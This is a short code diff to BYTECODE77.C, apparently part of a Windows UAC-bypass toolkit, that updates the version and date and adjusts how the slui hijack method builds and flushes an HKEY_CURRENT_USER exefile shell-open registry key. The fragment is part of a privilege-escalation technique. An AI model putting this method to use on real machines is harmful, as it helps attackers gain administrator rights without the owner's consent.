@@ -4,9 +4,9 @@
 *
 *  TITLE:       BYTECODE77.C
 *
-*  VERSION:     2.86
+*  VERSION:     2.87
 *
-*  DATE:        15 Jan 2018
+*  DATE:        19 Jan 2018
 *
 *  bytecode77 autoelevation methods.
 *
@@ -134,10 +134,11 @@ BOOL ucmMethodSluiHijack(
     }
 #endif
 
-    //
+     //
      // Create or open target key.
      //
-    _strcpy(szBuffer, T_EXEFILE_SHELL_OPEN);
+    _strcpy(szBuffer, T_EXEFILE_SHELL);
+    _strcat(szBuffer, T_SHELL_OPEN_COMMAND);
     lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szBuffer, 0, NULL,
         REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
 
@@ -178,6 +179,7 @@ BOOL ucmMethodSluiHijack(
             }
             RegDeleteValue(hKey, TEXT(""));
         }
+        RegFlushKey(hKey);
         RegCloseKey(hKey);
     }
 
